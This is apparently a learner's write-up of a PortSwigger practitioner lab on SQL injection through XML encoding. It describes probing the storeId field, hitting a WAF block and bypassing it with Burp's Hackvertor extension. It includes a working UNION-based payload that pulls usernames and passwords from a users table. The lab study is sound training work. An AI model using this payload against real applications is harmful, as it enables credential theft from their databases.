# [SQL injection with filter bypass via XML encoding] — [PortSwigger] — [Practitioner]
**Date:** 2026-05-07
 
---
 
## Vulnerability / core concept
SQL Injection via XML Encoding

## What made me stuck
As I am using Caido as my main tool, I tried to find a right way of encoding that would pass the WAF filter, but as I am not very experienced in XML, it was hard for me.
 
## What unblocked me
I used Burp Suite for this lab and used their Hackvertor extension to try differen encodings that eventually worked.
 
---


## Attack path
1) First we need to check whether web application executes expressions that we create inside of xml. We can do this by changing `storeId` from 1 to 1+1. If we receive different response that means web application parses our input directly into query and executes it.
2) Now, we need to use UNION injections to check the number of columns in first SELECT. However, when we try this, we get "Attack detected" error by WAF.
3) To bypass this WAF filter we can use Burp Suite extension Hackvertor and try different encoding ways to see which one works.


---


## Payload / key command
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            2
            </productId>
        <storeId>
            <@dec_entities>
                1 union select password||'-'||username from users
                </@dec_entities>
            </storeId>
    </stockCheck>
```

---


## What I'd recognize faster next time
The smart use of tools is what important to exploit web applications. It is always a good idea to have knowledge of multiple tools so you can use them when they are the best fit!
 

